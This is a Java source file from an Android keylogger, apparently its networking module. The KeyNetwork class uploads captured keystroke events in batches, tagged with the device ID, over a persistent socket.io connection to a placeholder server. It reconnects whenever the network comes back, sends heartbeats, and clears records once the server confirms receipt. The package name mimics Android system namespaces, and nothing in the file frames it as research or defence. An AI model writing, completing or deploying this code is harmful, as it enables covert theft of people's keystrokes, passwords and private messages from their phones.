package com.android.inject.keystroker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

import java.net.URISyntaxException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class KeyNetwork {

    private static final String TAG = "KeyNetwork";
    private static final String URL = "https://your-server.com";
    private static final int RECON_DELAY = 5;
    private static final int HB_INTERVAL = 30;

    private Context ctx;
    private Socket socket;
    private KeyLoggerDAO dao;
    private AtomicBoolean connected = new AtomicBoolean(false);
    private ScheduledExecutorService hbExec;
    private BroadcastReceiver netRecv;
    private boolean recvReg = false;

    public KeyNetwork(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.dao = new KeyLoggerDAO(this.ctx);
        initNetMonitor();
    }

    public void connect() {
        try {
            IO.Options opts = new IO.Options();
            opts.forceNew = true;
            opts.reconnection = true;
            opts.reconnectionDelay = RECON_DELAY * 1000;
            opts.reconnectionDelayMax = 30000;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket"};
            socket = IO.socket(URL, opts);
        } catch (URISyntaxException e) { Log.e(TAG, "URL error: " + e.getMessage()); return; }

        socket.on(Socket.EVENT_CONNECT, args -> {
            connected.set(true);
            Log.d(TAG, "Connected.");
            sendPending();
            startHB();
        });
        socket.on(Socket.EVENT_DISCONNECT, args -> { connected.set(false); stopHB(); });
        socket.on(Socket.EVENT_CONNECT_ERROR, args -> { connected.set(false); stopHB(); });
        socket.on("data_received", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                try {
                    JSONArray ids = ((JSONObject) args[0]).getJSONArray("synced_ids");
                    dao.markSynced(ids);
                    if (dao.countUnsynced() > 1000) dao.garbageCollect();
                } catch (Exception e) { Log.e(TAG, "Ack error: " + e.getMessage()); }
            }
        });
        socket.connect();
    }

    public void disconnect() {
        stopHB();
        if (socket != null) { socket.disconnect(); socket.off(); socket = null; }
        unregNet();
        connected.set(false);
    }

    public boolean isConnected() { return connected.get() && socket != null && socket.connected(); }

    public void sendPending() {
        if (!isConnected()) return;
        JSONArray data = dao.fetchUnsynced(500);
        if (data == null || data.length() == 0) return;
        try {
            JSONObject payload = new JSONObject();
            payload.put("device_id", getDeviceId());
            payload.put("timestamp", System.currentTimeMillis());
            payload.put("event_count", data.length());
            payload.put("events", data);
            socket.emit("log_data", payload);
            Log.d(TAG, "Sent " + data.length() + " events.");
        } catch (Exception e) { Log.e(TAG, "Send error: " + e.getMessage()); }
    }

    private void startHB() {
        if (hbExec != null && !hbExec.isShutdown()) return;
        hbExec = Executors.newSingleThreadScheduledExecutor();
        hbExec.scheduleAtFixedRate(() -> {
            if (isConnected()) {
                try {
                    JSONObject hb = new JSONObject();
                    hb.put("type", "heartbeat");
                    hb.put("device_id", getDeviceId());
                    hb.put("timestamp", System.currentTimeMillis());
                    socket.emit("heartbeat", hb);
                } catch (Exception ignored) {}
            }
        }, HB_INTERVAL, HB_INTERVAL, TimeUnit.SECONDS);
    }

    private void stopHB() {
        if (hbExec != null && !hbExec.isShutdown()) { hbExec.shutdownNow(); hbExec = null; }
    }

    private String getDeviceId() {
        return android.provider.Settings.Secure.getString(ctx.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
    }

    private void initNetMonitor() {
        netRecv = new BroadcastReceiver() {
            @Override
            public void onReceive(Context c, Intent i) {
                ConnectivityManager cm = (ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm == null) return;
                NetworkInfo ni = cm.getActiveNetworkInfo();
                if (ni != null && ni.isConnectedOrConnecting()) {
                    if (socket == null || !socket.connected()) {
                        if (socket != null) { socket.disconnect(); socket.off(); }
                        connect();
                    } else if (!connected.get()) socket.connect();
                    if (isConnected()) sendPending();
                }
            }
        };
        ctx.registerReceiver(netRecv, new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
        recvReg = true;
    }

    private void unregNet() {
        if (recvReg && netRecv != null) { try { ctx.unregisterReceiver(netRecv); } catch (Exception ignored) {} recvReg = false; }
    }
}